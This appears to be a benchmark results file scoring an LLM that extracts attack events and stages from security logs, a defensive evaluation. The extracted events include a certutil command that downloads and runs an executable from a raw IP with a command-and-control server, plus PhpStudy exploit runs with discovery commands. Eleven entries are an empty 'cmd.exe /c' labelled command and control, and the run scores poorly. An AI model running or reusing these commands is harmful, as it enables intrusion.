@@ -1,0 +1,112 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "cmd.exe /c \"taskkill /f /im agent.exe&certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe&cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443\"",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Persistence"
+      },
+      {
+        "command": "cmd.exe /c python PhpStudyPoc.py http://121.36.30.176/",
+        "stage": "Collection"
+      },
+      {
+        "command": "cmd.exe /c 'python PhpStudyExp2.py http://121.36.30.176/ \"whoami&arp -a&ipconfig&ping www.baidu.com -c 1\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "cmd.exe /c ",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd.exe /c ",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd.exe /c ",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd.exe /c ",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd.exe /c ",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd.exe /c ",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd.exe /c ",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd.exe /c ",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd.exe /c ",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd.exe /c ",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd.exe /c ",
+        "stage": "Command and Control"
+      }
+    ],
+    "narrative": "The attack began with an initial compromise using a malicious payload delivered via a crafted URL. It then established persistent backdoor communication channels and executed commands for espionage and maintaining access.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 24239,
+      "completion_tokens": 3133,
+      "total_tokens": 27372,
+      "wall_clock_s": 35.454,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.13333333333333333,
+      "recall": 0.3333333333333333,
+      "f1": 0.19047619047619044,
+      "tp": 2,
+      "fp": 13,
+      "fn": 4
+    },
+    "stage": {
+      "precision": 0.06666666666666667,
+      "recall": 0.16666666666666666,
+      "f1": 0.09523809523809522,
+      "tp": 1,
+      "fp": 14,
+      "fn": 5,
+      "recall_partial": 0.25
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 24239,
+      "completion_tokens": 3133,
+      "total_tokens": 27372,
+      "wall_clock_s": 35.454,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v5_got_links",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true,
+    "got_link_hints": true
+  }
+}
